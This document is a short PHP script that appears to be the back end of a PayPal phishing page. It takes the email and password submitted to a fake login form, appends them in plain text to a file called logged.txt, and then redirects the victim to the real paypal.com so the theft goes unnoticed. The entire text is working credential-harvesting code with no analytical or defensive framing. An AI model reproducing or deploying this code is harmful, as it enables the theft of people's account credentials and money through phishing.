<?php

$email = $_POST['login_email'];
$pass = $_POST['login_password'];

$f = fopen('logged.txt','a');
fwrite($f,'mail:' . $email . ' pass:' . $pass . ' ');
echo '
 <SCRIPT LANGUAGE="JavaScript">
  document.location.href="https://www.paypal.com/"
 </SCRIPT>
'

?>
